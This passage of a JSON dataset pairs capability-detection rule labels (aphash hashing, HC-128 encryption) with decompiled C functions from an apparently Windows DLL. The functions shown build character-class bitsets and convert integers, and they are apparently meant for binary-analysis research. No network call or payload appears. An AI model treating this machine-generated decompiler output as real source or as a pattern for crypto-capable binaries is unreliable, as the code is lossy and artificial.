uVar8 = uVar7;\n                } while (uVar7 < *(iVar1 + 4));\n            }\n        }\n        if (uVar3 < 0x100) {\n            if ((*(arg2 + 0x28) != 0) && (uVar7 = 1,  (*((uVar3 >> 3) + *(arg2 + 0x28)) & 1 << (uVar3 & 7)) != 0))\n            goto code_r0x00018001af84;\n        }\n        else {\n            iVar1 = *(arg2 + 0x30);\n            if (iVar1 != 0) {\n                puVar10 = *(iVar1 + 8);\n                for (puVar5 = puVar10; (puVar5 != puVar10 + *(iVar1 + 4) && (*puVar5 != uVar3)); puVar5 = puVar5 + 1) {\n                }\n                if (puVar5 != puVar10 + *(iVar1 + 4)) {\n                    uVar7 = 1;\n                    goto code_r0x00018001af84;\n                }\n            }\n            iVar6 = *(arg2 + 0x40);\n            if (iVar6 != 0) {\n                if (iVar6 == -1) {\n                    iVar6 = 0x107;\n                }\n                cVar2 = (**(**(arg1[0x1a] + 4) + 0x20))(*(arg1[0x1a] + 4), iVar6, uVar3);\n                if (cVar2 != '\\0') {\n                    uVar7 = 1;\n                    goto code_r0x00018001af84;\n                }\n            }\n            if ((*(arg2 + 0x48) != 0) && (cVar2 = fcn.180019870(uVar3, *(arg2 + 0x48), arg1[0x1a]),  cVar2 != '\\0')) {\ncode_r0x00018001b04b:\n                uVar7 = 1;\n                goto code_r0x00018001af84;\n            }\n        }\n        uVar7 = 0;\n    }\n    else {\n        uVar7 = 1;\n        puVar9 = puVar5;\n    }\ncode_r0x00018001af84:\n    if (uVar7 == (*(arg2 + 0xc) & 1)) {\n        return 0;\n    }\n    *arg1 = puVar9;\n    return 1;\n}\n",
        "token_count": 1018
    },
    "18001c00": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.18001c000(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    uint16_t **ppuVar5;\n    uchar (*pauVar6) [16];\n    uint32_t uVar7;\n    ulong ****ppppuVar8;\n    uint16_t *puVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    bool bVar12;\n    bool bVar13;\n    uchar auStack200 [32];\n    int64_t iStack168;\n    ulong uStack152;\n    uchar (*pauStack144) [16];\n    ulong ****appppuStack136 [3];\n    uint64_t uStack112;\n    ushort uStack104;\n    uchar auStack102 [6];\n    ulong ****appppuStack96 [2];\n    uint16_t *puStack80;\n    uint64_t uStack72;\n    uint64_t uStack64;\n    \n    uStack152 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack200;\n    iVar3 = *(arg1 + 8);\n    fcn.18001c310(*(arg1 + 0x18), appppuStack96, arg2, arg3);\n    uVar10 = 0;\n    do {\n        uStack104 = uVar10;\n        ppuVar5 = fcn.18001c310(*(arg1 + 0x18), appppuStack136, &uStack104, auStack102);\n        ppppuVar8 = appppuStack96;\n        if (7 < uStack72) {\n            ppppuVar8 = appppuStack96[0];\n        }\n        puVar9 = ppuVar5[2];\n        if (0x7 < ppuVar5[3]) {\n            ppuVar5 = *ppuVar5;\n        }\n        if (puVar9 == puStack80) {\n            if (puVar9 != NULL) {\n                uVar1 = *ppuVar5;\n                uVar2 = *ppppuVar8;\n                if (uVar2 <= uVar1) {\n                    iVar11 = ppuVar5 - ppppuVar8;\n                    bVar12 = uVar1 < uVar2;\n                    bVar13 = uVar1 == uVar2;\n                    do {\n                        if (!bVar12 && !bVar13) break;\n                        if (puVar9 == 0x1) goto code_r0x00018001c1f9;\n                        puVar9 = puVar9 + -1;\n                        ppppuVar8 = ppppuVar8 + 2;\n                        uVar1 = *(iVar11 + ppppuVar8);\n                        bVar12 = uVar1 < *ppppuVar8;\n                        bVar13 = uVar1 == *ppppuVar8;\n                    } while (!bVar12);\n                }\n                goto code_r0x00018001c0e9;\n            }\ncode_r0x00018001c1f9:\n            bVar12 = true;\n        }\n        else {\ncode_r0x00018001c0e9:\n            bVar12 = false;\n        }\n        if (7 < uStack112) {\n            ppppuVar8 = appppuStack136[0];\n            if (0xfff < uStack112 * 2 + 2) {\n                ppppuVar8 = appppuStack136[0][-1];\n                if (0x1f < appppuStack136[0] + (-8 - ppppuVar8)) {\n                    fcn.1800b3528();\n                    goto code_r0x00018001c206;\n                }\n            }\n            fcn.18008fb24(ppppuVar8);\n        }\n        if (bVar12) {\n            pauVar6 = *(iVar3 + 0x28);\n            if (pauVar6 == NULL) {\n                pauVar6 = fcn.18008fb2c(0x20);\n                *pauVar6 = ZEXT816(0);\n                pauVar6[1] = ZEXT816(0);\n                *(iVar3 + 0x28) = pauVar6;\n                pauStack144 = pauVar6;\n            }\n            uVar7 = (*pauVar6)[uVar10 >> 3] | 1 << (uVar10 & 7);\n            ppppuVar8 = uVar7;\n            (*pauVar6)[uVar10 >> 3] = uVar7;\n        }\n        uVar7 = uVar10 + 1;\n        uVar10 = uVar7;\n    } while (uVar7 < 0x100);\n    iStack168 = iVar3 + 0x48;\n    fcn.18001c210(ppppuVar8, arg2, arg3, arg4);\n    if (7 < uStack72) {\n        ppppuVar8 = appppuStack96[0];\n        if ((0xfff < uStack72 * 2 + 2) &&\n           (ppppuVar8 = appppuStack96[0][-1],  0x1f < appppuStack96[0] + (-8 - ppppuVar8))) {\ncode_r0x00018001c206:\n            fcn.1800b3528();\n            pcVar4 = swi(3);\n            (*pcVar4)();\n            return;\n        }\n        fcn.18008fb24(ppppuVar8);\n    }\n    fcn.18008fb00(uStack64 ^ auStack200);\n    return;\n}\n",
        "token_count": 1253
    },
    "180020b5": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180020b50(ushort *arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int16_t *piVar3;\n    int16_t *arg2_00;\n    uchar auStack104 [32];\n    ushort *puStack72;\n    int16_t aiStack26 [2];\n    int16_t aiStack22 [3];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack104;\n    arg2_00 = aiStack22;\n    uVar2 = arg2;\n    if (arg2 < 0) {\n        arg2._0_4_ = -arg2;\n        do {\n            piVar3 = arg2_00;\n            arg2_00 = piVar3 + -1;\n            *arg2_00 = arg2 + (arg2 / 10) * -10 + 0x30;\n            arg2._0_4_ = arg2 / 10;\n        } while (arg2 != 0);\n        arg2_00 = piVar3 + -2;\n        *arg2_00 = 0x2d;\n    }\n    else {\n        do {\n            arg2_00 = arg2_00 + -1;\n            uVar1 = uVar2 / 10;\n            *arg2_00 = uVar2 + uVar1 * -10 + 0x30;\n            uVar2 = uVar1;\n        } while (uVar1 != 0);\n    }\n    *(arg1 + 0xc) = 7;\n    *(arg1 + 8) = 0;\n    *arg1 = 0;\n    puStack72 = arg1;\n    if (arg2_00 != aiStack22) {\n        fcn.180010d70(arg1, arg2_00, aiStack22 - arg2_00 >> 1);\n    }\n    fcn.18008fb00(uStack16 ^ auStack104);\n    return;\n}\n",
        "token_count": 442
    },
    "180030e2": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180030e20(char **arg1)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    bool bVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    int32_t iVar7;\n    uchar (*pauVar8) [16];\n    char **ppcVar9;\n    char *pcVar10;\n    uint32_t uVar11;\n    \n    fcn.180032f70(arg1 + 8);\n    if (*(arg1 + 0x7c) == 0x5e) {\n        *(arg1[9] + 0xc) = *(arg1[9] + 0xc) ^ 1;\n        pcVar10 = *arg1;\n        if (pcVar10 != arg1[2]) {\n            if (*pcVar10 == '\\\\') {\n                pcVar1 = pcVar10 + 1;\n                if ((pcVar1 == arg1[2]) ||\n                   ((((*(arg1 + 0x10) & 8) != 0 || (1 < *pcVar1 - 0x28U)) &&\n                    (((*(arg1 + 0x10) & 0x10) != 0 || ((*pcVar1 + 0x85U & 0xfd) != 0)))))) {\n                    bVar3 = false;\n                }\n                else {\n                    bVar3 = true;\n                }\n                if (bVar3) {\n                    pcVar10 = pcVar1;\n                }\n            }\n            *arg1 = pcVar10 + 1;\n        }\n        fcn.180030080(arg1);\n    }\n    if (((*(arg1 + 0x10) & 0x20000000) != 0) && (*(arg1 + 0x7c) == 0x5d)) {\n        uVar4 = 0x5d;\n        if ((*(arg1 + 10) & 0x100) != 0) {\n            uVar4 = (**(**(arg1[0xb] + 8) + 0x20))();\n        }\n        pcVar10 = arg1[9];\n        pauVar8 = *(pcVar10 + 0x28);\n        if (pauVar8 == NULL) {\n            pauVar8 = fcn.18008fb2c(0x20);\n            *pauVar8 = ZEXT816(0);\n            pauVar8[1] = ZEXT816(0);\n            *(pcVar10 + 0x28) = pauVar8;\n        }\n        (*pauVar8)[uVar4 >> 3] = (*pauVar8)[uVar4 >> 3] | 1 << (uVar4 & 7);\n        pcVar10 = *arg1;\n        if (pcVar10 != arg1[2]) {\n            if (*pcVar10 == '\\\\') {\n                pcVar1 = pcVar10 + 1;\n                if ((pcVar1 == arg1[2]) ||\n                   ((((*(arg1 + 0x10) & 8) != 0 || (1 < *pcVar1 - 0x28U)) &&\n                    (((*(arg1 + 0x10) & 0x10) != 0 || ((*pcVar1 + 0x85U & 0xfd) != 0)))))) {\n                    bVar3 = false;\n                }\n                else {\n                    bVar3 = true;\n                }\n                if (bVar3) {\n                    pcVar10 = pcVar1;\n                }\n            }\n            *arg1 = pcVar10 + 1;\n        }\n        fcn.180030080(arg1);\n    }\n    ppcVar9 = arg1;\n    iVar7 = fcn.180033b00(arg1);\n    if (iVar7 == 0) {\n        return;\n    }\n    do {\n        if (iVar7 != 2) {\n            uVar11 = *(arg1 + 0x74);\n            if ((uVar11 == 0) && ((*(arg1 + 0x10) & 0x100000) == 0)) {\n                fcn.180015140(ppcVar9, 2);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (*(arg1 + 0x7c) == 0x2d) {\n                pcVar10 = *arg1;\n                if (pcVar10 != arg1[2]) {\n                    if (*pcVar10 == '\\\\') {\n                        pcVar1 = pcVar10 + 1;\n                        if ((pcVar1 == arg1[2]) ||\n                           ((((*(arg1 + 0x10) & 8) != 0 || (1 < *pcVar1 - 0x28U)) &&\n                            (((*(arg1 + 0x10) & 0x10) != 0 || ((*pcVar1 + 0x85U & 0xfd) != 0)))))) {\n                            bVar3 = false;\n                        }\n                        else {\n                            bVar3 = true;\n                        }\n                        if (bVar3) {\n                            pcVar10 = pcVar1;\n                        }\n                    }\n                    *arg1 = pcVar10 + 1;\n                }\n                fcn.180030080(arg1);\n                uVar4 = *(arg1 + 0x74);\n                ppcVar9 = arg1;\n                iVar7 = fcn.180033b00(arg1);\n                if (iVar7 == 0) {\n                    uVar4 = *(arg1 + 0x74);\n                    if ((*(arg1 + 10) & 0x100) != 0) {\n                        uVar4 = (**(**(arg1[0xb] + 8) + 0x20))();\n                    }\n                    pcVar10 = arg1[9];\n                    pauVar8 = *(pcVar10 + 0x28);\n                    if (pauVar8 == NULL) {\n                        pauVar8 = fcn.18008fb2c(0x20);\n                        *pauVar8 = ZEXT816(0);\n                        pauVar8[1] = ZEXT816(0);\n                        *(pcVar10 + 0x28) = pauVar8;\n                    }\n                    uVar6 = 0x2d;\n                    (*pauVar8)[uVar4 >> 3] = (*pauVar8)[uVar4 >> 3] | 1 << (uVar4 & 7);\n                    if ((*(arg1 + 10) & 0x100) != 0) {\n                        uVar6 = (**(**(arg1[0xb] + 8) + 0x20))();\n                    }\n                    pcVar10 = arg1[9];\n                    pauVar8 = *(pcVar10 + 0x28);\n                    if (pauVar8 == NULL) {\n                        pauVar8 = fcn.18008fb2c(0x20);\n                        *pauVar8 = ZEXT816(0);\n                        pauVar8[1] = ZEXT816(0);\n                        *(pcVar10 + 0x28) = pauVar8;\n                    }\n                    (*pauVar8)[uVar6 >> 3] = (*pauVar8)[uVar6 >> 3] | 1 << (uVar6 & 7);\n                    return;\n                }\n                if (iVar7 == 2) {\n                    fcn.180015140(ppcVar9, 8);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                if ((*(arg1 + 0xe) & 0x800) != 0) {\n                    cVar5 = fcn.1800323a0(arg1[0xd]);\n                    *(arg1 + 0x74) = cVar5;\n                    ppcVar9 = arg1[0xd];\n                    uVar4 = fcn.1800323a0(ppcVar9);\n                }\n                if (*(arg1 + 0x74) < uVar4) {\n                    fcn.180015140(ppcVar9, 8);\n                    pcVar2 = swi(3);\n                    (*pcVar2)();\n                    return;\n                }\n                fcn.180033e60(arg1 + 8);\n            }\n            else {\n                if ((*(arg1 + 10) & 0x100) != 0) {\n                    uVar4 = (**(**(arg1[0xb] + 8) + 0x20))();\n                    uVar11 = uVar4;\n                }\n                pcVar10 = arg1[9];\n                pauVar8 = *(pcVar10 + 0x28);\n                if (pauVar8 == NULL) {\n                    pauVar8 = fcn.18008fb2c(0x20);\n                    *pauVar8 = ZEXT816(0);\n                    pauVar8[1] = ZEXT816(0);\n                    *(pcVar10 + 0x28) = pauVar8;\n                }\n                (*pauVar8)[(uVar11 & 0xff) >> 3] = (*pauVar8)[(uVar11 & 0xff) >> 3] | 1 << (uVar11 & 7);\n            }\n        }\n        ppcVar9 = arg1;\n        iVar7 = fcn.180033b00(arg1);\n        if (iVar7 == 0) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 2071
    },
    "18003171": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nuint8_t * fcn.180031710(int64_t arg1, uint8_t *arg2, uint8_t *arg3, int64_t arg4)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint32_t *puVar3;\n    int64_t iVar4;\n    uint8_t uVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    \n    if (arg4 == 0) {\n        arg4 = *(arg1 + 0xb0);\n    }\n    if (arg2 == arg3) {\n        return arg2;\n    }\n    do {\n        if (arg4 == 0) {\n            return arg2;\n        }\n    // switch table (21 cases) at 0x1800319a4\n        switch(*(arg4 + 8)) {\n        case 1:\n        case 8:\n        case 9:\n        case 0xd:\n        case 0xe:\n        case 0x14:\n            arg4 = *(arg4 + 0x10);\n            break;\n        case 2:\n            if (arg2[-1] == 10) {\n                return arg2;\n            }\n            goto code_r0x000180031777;\n        case 3:\n            goto code_r0x0001800317a0;\n        default:\n            return arg2;\n        case 6:\n            goto code_r0x0001800317c0;\n        case 7:\n            do {\n                puVar1 = arg2 + 1;\n                uVar2 = *arg2;\n                for (puVar3 = *(arg4 + 0x20); puVar3 != NULL; puVar3 = *(puVar3 + 6)) {\n                    uVar8 = 0;\n                    if (puVar3[3] != 0) {\n                        uVar7 = *puVar3;\n                        do {\n                            uVar6 = 0;\n                            puVar9 = arg2;\n                            if (uVar7 != 0) {\n                                do {\n                                    uVar5 = *puVar9;\n                                    puVar9 = puVar9 + 1;\n                                    if (uVar5 != *(uVar8 + *(puVar3 + 4) + uVar6)) break;\n                                    uVar6 = uVar6 + 1;\n                                } while (uVar6 < uVar7);\n                            }\n                            if (puVar9 == puVar1) {\n                                if (puVar1 == arg2) goto code_r0x000180031890;\n                                uVar7 = 1;\n                                goto code_r0x000180031926;\n                            }\n                            uVar10 = uVar8 + uVar7;\n                            uVar8 = uVar10;\n                        } while (uVar10 < puVar3[3]);\n                    }\n                }\ncode_r0x000180031890:\n                iVar4 = *(arg4 + 0x38);\n                if (iVar4 != 0) {\n                    uVar5 = uVar2;\n                    if ((*(arg1 + 0xb8) & 0x800) != 0) {\n                        uVar5 = fcn.1800323a0(*(arg1 + 0xd0));\n                    }\n                    uVar8 = 0;\n                    if (*(iVar4 + 4) != 0) {\n                        do {\n                            puVar9 = uVar8 + *(iVar4 + 8);\n                            if ((*puVar9 < uVar5 || *puVar9 == uVar5) &&\n                               (puVar9 = uVar8 + 1 + *(iVar4 + 8),  uVar5 < *puVar9 || uVar5 == *puVar9))\n                            goto code_r0x00018003191d;\n                            uVar7 = uVar8 + 2;\n                            uVar8 = uVar7;\n                        } while (uVar7 < *(iVar4 + 4));\n                    }\n                }\n                if ((*(arg4 + 0x28) == 0) || ((*((uVar2 >> 3) + *(arg4 + 0x28)) & 1 << (uVar2 & 7)) == 0)) {\n                    uVar7 = 0;\n                }\n                else {\ncode_r0x00018003191d:\n                    uVar7 = 1;\n                }\ncode_r0x000180031926:\n                if ((uVar7 != (*(arg4 + 0xc) & 1)) || (arg2 = puVar1,  puVar1 == arg3)) {\n                    return arg2;\n                }\n            } while( true );\n        case 0xc:\n        case 0x15:\n            arg4 = 0;\n            break;\n        case 0x10:\n            goto code_r0x000180031968;\n        }\n    } while( true );\ncode_r0x000180031968:\n    do {\n        if (arg4 == 0) {\n            return arg3;\n        }\n        arg3 = fcn.180031710(arg1, arg2, arg3, *(arg4 + 0x10));\n        arg4 = *(arg4 + 0x28);\n    } while (arg2 != arg3);\n    return arg3;\ncode_r0x0001800317c0:\n    do {\n        puVar1 = arg2 + 1;\n        puVar9 = fcn.180033900(arg2, puVar1, *(arg4 + 0x28), *(arg4 + 0x28) + 1);\n        if (puVar9 != arg2) {\n            return arg2;\n        }\n        arg2 = puVar1;\n    } while (puVar1 != arg3);\n    return puVar1;\ncode_r0x0001800317a0:\n    do {\n        if (*arg2 == 10) {\n            return arg2;\n        }\n        arg2 = arg2 + 1;\n    } while (arg2 != arg3);\n    return arg2;\n    while (arg2 = arg2 + 1,  arg2 != arg3) {\ncode_r0x000180031777:\n        if (*arg2 == 10) break;\n    }\n    if (arg2 != arg3) {\n        arg2 = arg2 + 1;\n    }\n    return arg2;\n}\n",
        "token_count": 1391
    },
    "180033e6": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180033e60(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar (*pauVar6) [16];\n    ulong *puVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint8_t in_DL;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint8_t in_R8B;\n    \n    uVar11 = in_R8B;\n    if ((*(arg1 + 0x10) & 0x100) == 0) {\n        uVar10 = in_DL;\n    }\n    else {\n        cVar3 = (**(**(*(arg1 + 0x18) + 8) + 0x20))();\n        uVar10 = cVar3;\n        cVar3 = (**(**(*(arg1 + 0x18) + 8) + 0x20))();\n        uVar11 = cVar3;\n    }\n    iVar9 = *(arg1 + 8);\n    if (uVar10 <= uVar11) {\n        while (uVar11 < *(arg1 + 0x20)) {\n            pauVar6 = *(iVar9 + 0x28);\n            if (pauVar6 == NULL) {\n                pauVar6 = fcn.18008fb2c(0x20);\n                *pauVar6 = ZEXT816(0);\n                pauVar6[1] = ZEXT816(0);\n                *(iVar9 + 0x28) = pauVar6;\n            }\n            uVar5 = uVar10 >> 3;\n            uVar4 = uVar10 & 7;\n            uVar10 = uVar10 + 1;\n            (*pauVar6)[uVar5] = (*pauVar6)[uVar5] | 1 << uVar4;\n            if (uVar11 < uVar10) {\n                return;\n            }\n        }\n        if (uVar11 < uVar10) {\n            return;\n        }\n        if (uVar11 - uVar10 < *(arg1 + 0x24)) {\n            do {\n                fcn.1800340d0(arg1);\n                uVar10 = uVar10 + 1;\n            } while (uVar10 <= uVar11);\n            return;\n        }\n        puVar7 = *(iVar9 + 0x38);\n        if (puVar7 == NULL) {\n            puVar7 = fcn.18008fb2c(0x10);\n            *puVar7 = 0;\n            puVar7[1] = 0;\n            *(iVar9 + 0x38) = puVar7;\n        }\n        uVar5 = *(puVar7 + 4);\n        if (*puVar7 < uVar5 || *puVar7 == uVar5) {\n            uVar4 = uVar5 + 0x10;\n            iVar8 = fcn.1800b15d0(puVar7[1], uVar4);\n            if (iVar8 == 0) goto code_r0x000180033fe4;\n            puVar7[1] = iVar8;\n            uVar5 = *(puVar7 + 4);\n            *puVar7 = uVar4;\n        }\n        *(uVar5 + puVar7[1]) = uVar10;\n        *(puVar7 + 4) = *(puVar7 + 4) + 1;\n        puVar1 = *(iVar9 + 0x38);\n        uVar10 = puVar1[1];\n        if (*puVar1 < uVar10 || *puVar1 == uVar10) {\n            uVar5 = uVar10 + 0x10;\n            iVar9 = fcn.1800b15d0(*(puVar1 + 2), uVar5);\n            if (iVar9 == 0) {\ncode_r0x000180033fe4:\n                fcn.18006df20();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            *(puVar1 + 2) = iVar9;\n            uVar10 = puVar1[1];\n            *puVar1 = uVar5;\n        }\n        *(uVar10 + *(puVar1 + 2)) = uVar11;\n        puVar1[1] = puVar1[1] + 1;\n    }\n    return;\n}\n",
        "token_count": 993
    },
    "180033ff": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180033ff0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uchar (*pauVar2) [16];\n    uint16_t in_DX;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    char in_R8B;\n    bool bVar5;\n    \n    iVar1 = *(arg1 + 8);\n    uVar3 = 0;\n    uVar4 = 0;\n    do {\n        if (in_DX == 0xffff) {\n            if ((uVar3 == '_') || ((*(*(*(*(arg1 + 0x18) + 8) + 0x18) + (uVar3 & 0xff) * 2) & 0x107) != 0)) {\n                bVar5 = true;\n            }\n            else {\n                bVar5 = false;\n            }\n        }\n        else {\n            bVar5 = (*(*(*(*(arg1 + 0x18) + 8) + 0x18) + (uVar3 & 0xff) * 2) & in_DX) != 0;\n        }\n        if (bVar5 != in_R8B) {\n            pauVar2 = *(iVar1 + 0x28);\n            if (pauVar2 == NULL) {\n                pauVar2 = fcn.18008fb2c(0x20);\n                *pauVar2 = ZEXT816(0);\n                pauVar2[1] = ZEXT816(0);\n                *(iVar1 + 0x28) = pauVar2;\n            }\n            (*pauVar2)[uVar4 >> 3] = (*pauVar2)[uVar4 >> 3] | 1 << (uVar3 & 7);\n        }\n        uVar3 = uVar3 + 1;\n        uVar4 = uVar4 + 1;\n    } while (uVar3 < 0x100);\n    return;\n}\n",
        "token_count": 429
    },
    "1800346a": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nulong fcn.1800346a0(uint8_t **arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    uint32_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    uint32_t uVar11;\n    uint8_t *puVar12;\n    \n    puVar12 = *arg1;\n    uVar2 = *puVar12;\n    if ((*(arg1 + 0x17) & 0x100) != 0) {\n        uVar2 = (**(**(arg1[0x1a] + 8) + 0x20))();\n        puVar12 = *arg1;\n    }\n    puVar7 = *(arg2 + 0x20);\n    puVar9 = puVar12 + 1;\n    if (puVar7 != NULL) {\n        do {\n            uVar6 = 0;\n            if (puVar7[3] != 0) {\n                uVar5 = *puVar7;\n                do {\n                    uVar4 = 0;\n                    puVar10 = puVar12;\n                    if (uVar5 != 0) {\n                        do {\n                            uVar3 = *puVar10;\n                            puVar10 = puVar10 + 1;\n                            if (uVar3 != *(uVar6 + *(puVar7 + 4) + uVar4)) break;\n                            uVar4 = uVar4 + 1;\n                        } while (uVar4 < uVar5);\n                    }\n                    puVar8 = arg1[0x14];\n                    if (puVar10 == arg1[0x14]) goto code_r0x00018003475e;\n                    uVar11 = uVar6 + uVar5;\n                    uVar6 = uVar11;\n                } while (uVar11 < puVar7[3]);\n            }\n            puVar7 = *(puVar7 + 6);\n            puVar8 = puVar12;\n        } while (puVar7 != NULL);\ncode_r0x00018003475e:\n        if (puVar8 != *arg1) {\ncode_r0x00018003476b:\n            uVar5 = 1;\n            puVar9 = puVar8;\n            goto code_r0x000180034806;\n        }\n    }\n    iVar1 = *(arg2 + 0x38);\n    if (iVar1 != 0) {\n        uVar3 = uVar2;\n        if ((*(arg1 + 0x17) & 0x800) != 0) {\n            uVar3 = fcn.1800323a0(arg1[0x1a]);\n        }\n        uVar6 = 0;\n        if (*(iVar1 + 4) != 0) {\n            do {\n                puVar12 = uVar6 + *(iVar1 + 8);\n                if ((*puVar12 < uVar3 || *puVar12 == uVar3) &&\n                   (puVar12 = uVar6 + 1 + *(iVar1 + 8),  puVar8 = puVar9,  uVar3 < *puVar12 || uVar3 == *puVar12))\n                goto code_r0x00018003476b;\n                uVar5 = uVar6 + 2;\n                uVar6 = uVar5;\n            } while (uVar5 < *(iVar1 + 4));\n        }\n    }\n    if ((*(arg2 + 0x28) == 0) || (uVar5 = 1,  (*((uVar2 >> 3) + *(arg2 + 0x28)) & 1 << (uVar2 & 7)) == 0)) {\n        uVar5 = 0;\n    }\ncode_r0x000180034806:\n    if (uVar5 != (*(arg2 + 0xc) & 1)) {\n        *arg1 = puVar9;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 918
    },
    "18003513": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.180035130(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    bool bVar4;\n    int32_t iVar5;\n    ulong *arg1_00;\n    uchar (*pauVar6) [16];\n    int64_t arg1_01;\n    ulong ****ppppuVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uchar auStack152 [32];\n    ulong uStack120;\n    uchar (*pauStack112) [16];\n    int64_t aiStack104 [3];\n    uint64_t uStack80;\n    uchar uStack72;\n    uchar auStack71 [7];\n    ulong ****appppuStack64 [2];\n    int64_t iStack48;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    \n    uStack120 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack152;\n    iVar2 = *(arg1 + 8);\n    fcn.1800353b0(*(arg1 + 0x18), appppuStack64, arg2, arg3);\n    uVar9 = 0;\n    do {\n        uStack72 = uVar9;\n        arg1_00 = fcn.1800353b0(*(arg1 + 0x18), aiStack104, &uStack72, auStack71);\n        ppppuVar7 = appppuStack64;\n        if (0xf < uStack40) {\n            ppppuVar7 = appppuStack64[0];\n        }\n        piVar1 = arg1_00 + 2;\n        if (0xf < arg1_00[3]) {\n            arg1_00 = *arg1_00;\n        }\n        if (*piVar1 == iStack48) {\n            iVar5 = fcn.1800ae4d0(arg1_00, ppppuVar7, *piVar1);\n            if (iVar5 != 0) goto code_r0x0001800351d3;\n            bVar4 = true;\n        }\n        else {\ncode_r0x0001800351d3:\n            bVar4 = false;\n        }\n        if (0xf < uStack80) {\n            arg1_01 = aiStack104[0];\n            if (0xfff < uStack80 + 1) {\n                arg1_01 = *(aiStack104[0] + -8);\n                if (0x1f < (aiStack104[0] - arg1_01) - 8U) {\n                    fcn.1800b3528();\n                    goto code_r0x0001800352c4;\n                }\n            }\n            fcn.18008fb24(arg1_01);\n        }\n        if (bVar4) {\n            pauVar6 = *(iVar2 + 0x28);\n            if (pauVar6 == NULL) {\n                pauVar6 = fcn.18008fb2c(0x20);\n                *pauVar6 = ZEXT816(0);\n                pauVar6[1] = ZEXT816(0);\n                *(iVar2 + 0x28) = pauVar6;\n                pauStack112 = pauVar6;\n            }\n            (*pauVar6)[uVar9 >> 3] = (*pauVar6)[uVar9 >> 3] | 1 << (uVar9 & 7);\n        }\n        uVar8 = uVar9 + 1;\n        uVar9 = uVar8;\n    } while (uVar8 < 0x100);\n    if (0xf < uStack40) {\n        ppppuVar7 = appppuStack64[0];\n        if ((0xfff < uStack40 + 1) && (ppppuVar7 = appppuStack64[0][-1],  0x1f < appppuStack64[0] + (-8 - ppppuVar7))) {\ncode_r0x0001800352c4:\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        fcn.18008fb24(ppppuVar7);\n    }\n    fcn.18008fb00(uStack32 ^ auStack152);\n    return;\n}\n",
        "token_count": 969
    },
    "18003a61": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
